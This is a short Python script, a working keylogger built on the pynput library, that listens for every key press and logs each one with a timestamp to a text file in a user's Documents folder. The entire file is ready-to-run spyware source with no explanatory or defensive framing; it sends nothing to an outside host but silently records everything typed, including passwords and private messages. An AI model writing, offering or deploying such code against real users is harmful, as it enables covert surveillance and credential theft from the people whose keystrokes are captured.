from pynput.keyboard import Key, Listener
import logging

log_dir = 'C:\\Users\\*****\\Documents\\keylogger\\key_log.txt'#location where keylogger data will be stored
logging.basicConfig(filename=log_dir, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
